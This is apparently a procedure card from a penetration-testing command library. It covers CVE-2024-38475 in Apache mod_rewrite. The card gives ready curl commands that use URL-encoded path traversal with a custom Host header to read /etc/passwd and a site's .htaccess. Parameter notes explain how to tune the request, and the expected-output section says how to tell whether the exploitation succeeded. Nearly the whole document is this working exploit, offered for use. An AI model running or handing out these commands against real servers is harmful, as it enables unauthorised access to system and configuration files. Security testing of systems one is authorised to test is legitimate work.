---
data: >-
  curl -v "http://target.example.com/%2e%2e/%2e%2e/etc/passwd" -H "Host:
  vulnerable"
tags:
  - web
  - exploit
  - traversal
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: dd4993bb-4d18-4e58-b463-cb53cecb93fc
created_at: '2025-12-14T17:26:21.640Z'
updated_at: '2025-12-14T17:26:21.640Z'
verified: false
validated: true
submitted: true
---
# curl-mod_rewrite-test

## Command

```bash
curl -v "http://target.example.com/%2e%2e/%2e%2e/etc/passwd" -H "Host: vulnerable"
```

## Description

This curl command tests for CVE-2024-38475 by sending a verbose HTTP GET request with a URL-encoded path traversal payload to a vulnerable Apache server. It targets mod_rewrite substitutions, attempting to access unintended filesystem paths like /etc/passwd. Use it to verify exploitation by checking if the response serves restricted file contents.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers and connection details | Yes |
| URL (e.g., `http://target.example.com/%2e%2e/...`) | Target URL with traversal payload (%2e%2e for ../) | Yes |
| `-H "Host: vulnerable"` | Custom Host header to trigger virtual host rules | No (but recommended for vhost-specific rules) |

## Examples

### Basic Usage

```bash
curl -v "http://target.example.com/test"
```

### Advanced Usage

```bash
curl -v "http://target.example.com/%2e%2e/%2e%2e/var/www/.htaccess" -H "Host: vulnerable" --output response.txt
```

## Expected Output

Successful exploitation shows a 200 OK response with file contents (e.g., user list from /etc/passwd) in the body, plus verbose details like rewritten paths in headers. Failure: 404 or 403 without file data.

## Related

- [[Related Procedure: Exploit-Apache-mod_rewrite-Improper-Escaping]]
